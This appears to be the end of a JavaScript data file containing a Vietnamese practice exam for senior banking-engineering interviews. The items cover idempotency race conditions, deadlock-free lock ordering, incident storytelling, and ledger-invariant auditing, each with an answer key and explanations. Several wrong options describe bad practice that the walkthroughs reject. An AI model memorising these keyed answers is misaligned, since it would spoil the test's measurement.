          "tip": "Ghi nhớ đối xứng RxJS trong 5 giây: **Tìm kiếm / Autocomplete (Read)** -> `switchMap` (lấy cái mới nhất, bỏ cái cũ); **Chuyển tiền / Nộp tiền (Write)** -> `exhaustMap` (giữ cái đầu tiên, chặn click đúp)!"
        }
      },
      {
        "id": "R4-22",
        "domain": "Idempotency State Machine ở Tải 10.000 TPS (A1)",
        "lessonId": "A1",
        "difficulty": "Khó (Bẫy Race Condition trên chính Idempotency)",
        "caseStudy": null,
        "question": "Tại tầng Idempotency của hệ thống Chuyển tiền 10.000 TPS, do lỗi mạng di động gửi lặp gói TCP/HTTP retry sát nút, hai request mang **cùng một `Idempotency-Key: IDEM-8899`** bay tới 2 Pod khác nhau cách nhau đúng **2 mili-giây** (trong khi giao dịch đầu tiên cần 15 mili-giây mới chạy xong và lưu kết quả). Nếu code chỉ kiểm tra `SELECT * FROM idempotency_records WHERE key = 'IDEM-8899'` ở đầu hàm rồi mới lưu kết quả ở cuối hàm, chuyện gì xảy ra và cách thiết kế chuẩn ở tải cao là gì?",
        "options": [
          "Không sao cả vì 2 mili-giây là đủ dài để hai Pod tự nhường nhau qua cảm ứng mạng.",
          "Xóa cột khóa `UNIQUE` trên bảng `idempotency_records` để cả 2 Pod đều `INSERT` thành công ở cuối hàm mà không báo lỗi Database.",
          "Cả 2 Pod cùng chạy `SELECT` ở mili-giây thứ 0 và mili-giây thứ 2 đều thấy chưa có bản ghi kết quả, nên **cả 2 Pod cùng lọt song song vào Core Ledger trừ tiền 2 lần** (bẫy TOCTOU trên chính lớp Idempotency)! Cách thiết kế chuẩn là quản lý vòng đời trạng thái nguyên tử ngay từ đầu cổng: thực thi câu lệnh chiếm chỗ nguyên tử **`INSERT INTO idempotency_records(client_id, idem_key, payload_hash, status) VALUES (..., 'IN_PROGRESS') ON CONFLICT DO NOTHING`** (hoặc `Redis SET NX EX` kèm DB constraint) TRƯỚC khi hạch toán — Pod về chậm 2ms sẽ nhận `0 rows inserted`, đối chiếu `payload_hash` (nếu khác tham số thì báo `422 Unprocessable Entity`), thấy đang `IN_PROGRESS` thì trả `409 Conflict / chờ kết quả`, hoặc nếu `COMPLETED` thì trả lại nguyên vẹn biên lai đã lưu!",
          "Đặt `Thread.sleep(5000)` ở đầu mọi request chuyển tiền để làm chậm hệ thống lại."
        ],
        "answer": 2,
        "walkthrough": {
          "keyword": "hai request mang cùng một Idempotency-Key bay tới 2 Pod cách nhau đúng 2 mili-giây ... giao dịch đầu cần 15ms mới lưu kết quả",
          "whyCorrect": "Câu hỏi đẳng cấp Principal Architect! 80% ứng viên khi được hỏi về Idempotency chỉ trả lời *'Em kiểm tra trong DB xem có key chưa, chưa có thì chạy xong lưu lại'* — và rớt điểm Senior ngay khi giám khảo vặn tiếp: *'Thế request thứ 2 bay tới lúc request thứ 1 đang chạy ở mili-giây thứ 2 chưa kịp lưu thì sao?!'*. Để Idempotency thực sự kín nước ở tải 10.000 TPS, bản ghi `idempotency_records` phải hoạt động như một **Atomic Claim + State Machine (`IN_PROGRESS -> COMPLETED / FAILED_FINAL`)**: dùng `INSERT ... ON CONFLICT DO NOTHING` giành quyền thực thi nguyên tử ngay mili-giây đầu tiên! Đặc biệt, đừng quên lưu thêm **`request_payload_hash`**: nếu Client cố tình gửi lại cùng `Idempotency-Key` cũ nhưng sửa số tiền từ 1 triệu lên 50 triệu, hệ thống phát hiện lệch băm và bác bỏ ngay theo chuẩn IETF Idempotency-Key!",
          "whyWrong": [
            "Hai Pod chạy độc lập hoàn toàn không hề biết sự tồn tại của nhau nếu không có điểm đồng bộ nguyên tử tại tầng lưu trữ.",
            "Xóa ràng buộc `UNIQUE` trên `idempotency_records` đồng nghĩa với việc phá hủy hoàn toàn chốt chặn cuối cùng chống ghi trùng của Database.",
            "",
            "Chèn `sleep(5000)` biến hệ thống 10.000 TPS thành hệ thống tê liệt ngốn sạch luồng thực thi."
          ],
          "tip": "Thiết kế Idempotency chuẩn 10k TPS (chuẩn Stripe / IETF): Phải **chiếm khóa nguyên tử ngay đầu luồng** (`INSERT ... status='IN_PROGRESS' ON CONFLICT DO NOTHING` + lưu `payload_hash`), KHÔNG BAO GIỜ đợi xử lý xong cuối hàm mới ghi!"
        }
      },
      {
        "id": "R4-23",
        "domain": "Chống Deadlock khi Khóa Đa Tài khoản & Chi Lương (A5)",
        "lessonId": "A5",
        "difficulty": "Trung bình",
        "caseStudy": null,
        "question": "Hai dịch vụ đang chạy đồng thời trên Core Ledger: Luồng 1 thực hiện chuyển khoản từ Tài khoản `#500` sang Tài khoản `#100`; đúng mili-giây đó, Luồng 2 thực hiện chi hoàn ứng từ Tài khoản `#100` sang Tài khoản `#500` (hoặc một lô chi lương khóa một danh sách nhiều tài khoản). Nếu mỗi luồng khóa tài khoản nguồn trước (`SELECT ... FOR UPDATE`) rồi mới khóa tài khoản đích, hệ thống liên tục ném lỗi `DeadlockLoserDataAccessException`. Quy tắc lập trình nào triệt tiêu 100% Deadlock dạng này?",
        "options": [
          "Áp dụng **Thứ tự khóa toàn cục tất định (Deterministic Global Lock Ordering)**: trước khi gọi `SELECT ... FOR UPDATE`, luôn sắp xếp tập hợp tất cả các `accountId` tham gia giao dịch theo thứ tự tăng dần cố định (VD: `List<Long> sortedIds = Stream.of(fromId, toId).distinct().sorted().toList()`) rồi khóa tuần tự theo danh sách đã sắp xếp đó (cả Luồng 1 và Luồng 2 đều khóa `#100` trước rồi mới tới `#500`), kết hợp cấu hình `lock_timeout` ngắn hợp lý.",
          "Bắt lỗi `DeadlockLoserDataAccessException` bằng khối `catch` rỗng rồi trả về thông báo 'Chuyển tiền thành công' cho khách hàng đỡ lo lắng.",
          "Đổi thứ tự khóa thành ngẫu nhiên bằng `Collections.shuffle()` để may rủi xem lần sau hai luồng có đụng nhau nữa hay không.",
          "Gộp toàn bộ 12 triệu khách hàng của ngân hàng vào chung 1 dòng tài khoản duy nhất."
        ],
        "answer": 0,
        "walkthrough": {
          "keyword": "Luồng 1 chuyển #500 -> #100, Luồng 2 chuyển #100 -> #500 ... khóa nguồn trước rồi khóa đích gây Deadlock",
          "whyCorrect": "Định lý kinh điển của Hệ điều hành ứng dụng thẳng vào Core Banking! Deadlock chỉ có thể hình thành khi tồn tại đủ 4 điều kiện Coffman, trong đó mắt xích dễ bẻ gãy nhất bằng code chính là **Circular Wait (Chờ đợi vòng tròn)**: Luồng 1 ôm `#500` chờ `#100`, trong khi Luồng 2 ôm `#100` chờ `#500`. Chỉ bằng 1 dòng sắp xếp `sorted()` đưa thứ tự khóa về một chiều duy nhất từ bé đến lớn (`#100` luôn được hỏi khóa trước `#500` ở mọi nơi trong toàn bộ codebase, kể cả giao dịch 2 tài khoản lẫn giao dịch 10 tài khoản kèm ví phí!), chu trình chờ vòng tròn bị phá vỡ hoàn toàn về mặt toán học -> **xác suất Deadlock giữa các dòng tài khoản giảm về đúng 0%**!",
          "whyWrong": [
            "",
            "Khi xảy ra Deadlock, Database đã tự động hủy và rollback toàn bộ giao dịch thua cuộc; nuốt lỗi báo 'Thành công' trong khi tiền chưa hề chuyển đi là thảm họa nghiệp vụ nghiêm trọng nhất!",
            "Xáo trộn ngẫu nhiên `shuffle()` vẫn giữ nguyên xác suất 50% hai luồng chọn ngược chiều nhau và tiếp tục nổ Deadlock đều đặn dưới tải cao.",
            "Gộp chung 1 dòng làm mất hoàn toàn tài khoản riêng của khách hàng và biến toàn ngân hàng thành 1 điểm nghẽn duy nhất."
          ],
          "tip": "Mẹo code bất tử chống Deadlock trong Core Banking: Hễ một giao dịch cần khóa từ 2 bản ghi cùng bảng trở lên -> Luôn **`distinct().sorted()` danh sách ID tăng dần** trước khi gọi `SELECT ... FOR UPDATE`!"
        }
      },
      {
        "id": "R4-24",
        "domain": "Kể chuyện Sự cố Production (STAR + Post-mortem) (A6)",
        "lessonId": "A6",
        "difficulty": "Trung bình",
        "caseStudy": null,
        "question": "Ở vòng phỏng vấn Behavioral với Giám đốc Khối Công nghệ Ngân hàng, bạn nhận được câu hỏi: *'Hãy kể về một sự cố Production nghiêm trọng nhất mà em từng trực tiếp tham gia xử lý hoặc một quyết định kỹ thuật sai lầm em từng rút kinh nghiệm'*. Phong cách trả lời nào ghi điểm cao nhất cho vị trí Senior/Tech Lead?",
        "options": [
          "Khẳng định suốt 8 năm đi làm bản thân chưa từng viết ra bất kỳ một lỗi nhỏ nào, còn mọi sự cố của công ty cũ đều là do đồng nghiệp dốt và do đội QA test ẩu.",
          "Trình bày gãy gọn, trung thực theo cấu trúc **STAR kết hợp tư duy Blameless Post-mortem**: (1) *Situation & Impact*: Nêu bối cảnh hệ thống và con số đo lường mức độ ảnh hưởng (VD: P99 tăng lên 12s ở luồng nào, ảnh hưởng bao nhiêu % giao dịch); (2) *Immediate Mitigation (Cầm máu)*: Hành động đầu tiên để bảo vệ an toàn tiền/dữ liệu khách hàng và khôi phục dịch vụ nhanh nhất (bật Kill-Switch, cô lập Pod lấy Thread Dump, rollback an toàn); (3) *Root Cause Analysis (5 Whys)*: Phân tích nguyên nhân kỹ thuật gốc rễ bằng số liệu mà không đổ lỗi cá nhân; (4) *Systemic Prevention*: Những chốt chặn tự động đã bổ sung vào kiến trúc/CI/Alert để cả tổ chức không bao giờ lặp lại loại lỗi đó nữa.",
          "Kể lan man suốt 25 phút về chuyện mâu thuẫn cá nhân nói xấu sếp cũ và tiết lộ luôn cả địa chỉ IP nội bộ cùng mật khẩu hệ thống của ngân hàng cũ.",
          "Trả lời rằng hễ hệ thống gặp sự cố ngoài giờ hành chính lúc 18h01 là mình tắt điện thoại đi ngủ vì đó là việc riêng của đội vận hành."
        ],
        "answer": 1,
        "walkthrough": {
          "keyword": "kể về một sự cố Production nghiêm trọng nhất ... ghi điểm cao nhất cho vị trí Senior/Tech Lead",
          "whyCorrect": "Giám đốc Công nghệ Ngân hàng hỏi câu này KHÔNG phải để tìm người 'chưa bao giờ gặp lỗi' (vì người chưa bao giờ gặp sự cố Production thường là người chưa từng chạm vào hệ thống lớn chạy thật!), mà để kiểm tra 3 phẩm chất cốt lõi của một Senior đáng tin cậy giao phó két tiền: **(1) Tâm thế sở hữu & trung thực (Ownership, không đổ lỗi cho QA/Junior)**, **(2) Phản xạ ưu tiên bảo toàn tiền bạc và cầm máu dịch vụ có kỷ luật dưới áp lực cao**, và **(3) Tư duy cải tiến hệ thống (Blameless Post-mortem)** — biến một sự cố đau thương thành quy tắc ArchUnit, Testcontainers hoặc Alert tự động bảo vệ toàn đội về sau!",
          "whyWrong": [
            "Tự nhận hoàn hảo tuyệt đối và đổ hết trách nhiệm cho QA/đồng nghiệp là Red Flag lớn nhất về thái độ hợp tác và sự thiếu trung thực ở cấp Senior.",
            "",
            "Nói xấu tổ chức cũ và làm lộ thông tin hạ tầng bảo mật của công ty cũ khiến nhà tuyển dụng đánh trượt ngay lập tức vì vi phạm đạo đức nghề nghiệp và cam kết bảo mật (NDA).",
            "Phủi bỏ hoàn toàn trách nhiệm với mã nguồn mình viết ra khi xảy ra sự cố nghiêm trọng cho thấy thiếu tinh thần Ownership ('You build it, you run it')."
          ],
          "tip": "Khung vàng 4 ý kể chuyện Sự cố Production (3 phút): **Bối cảnh & Con số ảnh hưởng** -> **Hành động cầm máu bảo vệ tiền khách** -> **Root Cause kỹ thuật sâu sắc (không đổ lỗi)** -> **Chốt chặn tự động ngăn tái diễn vĩnh viễn**!"
        }
      },
      {
        "id": "R4-25",
        "domain": "Kiểm toán Bất biến Nội bộ Sổ Cái (Internal Ledger Audit) (C4, A2)",
        "lessonId": "C4",
        "difficulty": "Trung bình",
        "caseStudy": null,
        "question": "Ngoài Job Đối soát T+0/T+1 với đối tác bên ngoài như NAPAS, một hệ thống Core Banking chuẩn mực luôn có thêm một tiến trình **Đối soát & Kiểm toán Nội bộ Sổ cái (Continuous Internal Ledger Invariant Auditor)** chạy ngầm định kỳ mỗi vài phút trên Read Replica. Tiến trình này cần kiểm chứng những phương trình bất biến nào để phát hiện sớm nhất bất kỳ lỗi phần mềm hay can thiệp trái phép nào vào dữ liệu tiền tệ?",
        "options": [
          "Chỉ kiểm tra xem dung lượng ổ cứng còn trống trên 10% hay không là đủ.",
          "Chỉ chạy kiểm tra 5 năm một lần vào ngày thay đổi nhiệm kỳ kế toán trưởng.",
          "Tự động cộng thêm tiền giả vào một tài khoản rác bất kỳ mỗi khi thấy tổng Nợ và tổng Có không bằng nhau để làm đẹp báo cáo.",
          "Kiểm chứng đồng thời 3 phương trình bất biến kế toán: (1) Mọi `journal` đã hoàn tất đều thỏa `SUM(debit_postings) == SUM(credit_postings)`; (2) Tổng toàn cục toàn hệ thống `SUM(all_debits) == SUM(all_credits)`; và (3) Với các tài khoản phát sinh biến động trong kỳ cửa sổ kiểm tra, `current_ledger_balance == opening_balance + SUM(credits) - SUM(debits)` (đồng thời `available_balance == ledger_balance - active_holds_sum`); nếu lệch dù **1 đồng**, bắn cảnh báo mức P1 khẩn cấp và khoanh vùng tài khoản nghi vấn ngay lập tức!"
        ],
        "answer": 3,
        "walkthrough": {
          "keyword": "Continuous Internal Ledger Invariant Auditor chạy ngầm định kỳ mỗi vài phút ... kiểm chứng phương trình bất biến nào",
          "whyCorrect": "Câu khép lại trọn vẹn bộ 50 câu thi thử Senior Ngân hàng bằng nguyên lý phòng thủ cuối cùng bảo vệ két sắt! Dù code ứng dụng đã viết kỹ đến đâu, các ngân hàng và công ty Fintech hàng đầu luôn có một tiến trình **Continuous Ledger Auditor** đóng vai 'Kiểm toán viên độc lập không ngủ': cứ mỗi 5 phút nó quét cửa sổ các bút toán mới phát sinh trên bản sao đọc (Read Replica) để kiểm chứng 3 định luật bất biến: **Cân bằng từng chứng từ (`Journal Debit == Credit`)**, **Cân bằng toàn sổ cái**, và **Khớp số dư tức thời với tổng dòng tiền bút toán (`Balance == Opening + Credits - Debits`) + khớp tổng khoanh giữ `Hold`**. Nhờ tấm lưới an toàn này, nếu có một bug hiếm gặp hay ai đó chọc tay sửa thẳng DB làm lệch dù chỉ **1 VNĐ**, còi báo động P1 vang lên trong vòng chưa đầy 5 phút thay vì âm ỉ thành thảm họa hàng chục tỷ đồng sau nhiều tháng!",
          "whyWrong": [
            "Giám sát ổ cứng là hạ tầng cơ bản, hoàn toàn không phát hiện được sai lệch logic kế toán hay can thiệp số dư trái phép.",
            "Để 5 năm mới kiểm tra thì một lỗi lệch tiền nhỏ đã nhân lên hàng triệu lần và không còn khả năng truy vết khắc phục kịp thời.",
            "Tự sinh bút toán khống để che giấu chênh lệch sổ cái là hành vi gian lận kế toán bị nghiêm cấm tuyệt đối bởi pháp luật ngân hàng!",
            ""
          ],
          "tip": "Chốt hạ tư duy Kiến trúc sư Core Banking: Đừng chỉ tin vào code chặn từ đầu vào — hãy luôn đặt thêm **Continuous Ledger Invariant Auditor** kiểm chứng `SUM(Debit) == SUM(Credit)` và `Balance == SUM(Postings)` mỗi vài phút, cảnh báo P1 ngay khi lệch dù 1 đồng!"
        }
      }
    ]
  };

  window.EXAM_SETS.push(examR3, examR4);
})();
